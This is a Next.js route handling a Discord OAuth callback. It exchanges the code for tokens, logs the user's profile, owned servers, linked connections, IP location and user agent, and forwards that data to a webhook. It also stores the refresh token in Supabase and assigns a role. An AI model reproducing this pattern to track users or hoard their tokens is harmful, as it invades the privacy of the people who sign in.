import { logger } from "@/lib/functions/logger";
import { sendWebhook } from "@/lib/functions/webhook";
import { NextRequest, NextResponse } from "next/server";
import { pushToSupabase } from "@/lib/utils/supabase/push";
import { assignDiscordRole } from "@/lib/functions/discord-role";


const getToken = async (code: string) => {
    const body = new URLSearchParams({
        "grant_type": "authorization_code",
        "code": String(code),
        "redirect_uri": `${process.env.BASE_URL}/api/callback`,
    }).toString();

    const token = await fetch(`https://discord.com/api/v10/oauth2/token`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic " + Buffer.from(`${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`).toString("base64")
        },
        body: body
    });

    if (!token.ok) {
        throw new Error("Failed to fetch token");

    }

    return await token.json();
};

export async function GET(req: NextRequest) {
    try {
        const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
        const ua = req.headers.get("user-agent") ?? "unknown";

        const code = new URL(req.url).searchParams.get("code");

        if (!code) {
            throw new Error("No code provided");
        }

        const tokenResult = await getToken(code);

        const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);

        if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
            throw new Error("Failed to log user");
        }
        
        const roleResult = await assignDiscordRole(userInfo.id);

        if (!roleResult.success) {
            throw new Error("Failed to assign role");
        }
        
        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua);
        
        if (!webhookResult.success) {
            throw new Error("Failed to send webhook");
        }
        
        const pushResult = await pushToSupabase(tokenResult.refresh_token, userInfo, ipInfo, ua);

        if (!pushResult.success) {
            throw new Error("Failed to push to Supabase");
        }

        return NextResponse.redirect(`${process.env.BASE_URL}/success`);

    } catch (error) {
        console.error("Unexpected error: ", error);
        return NextResponse.redirect(`${process.env.BASE_URL}/error`);
    }
}
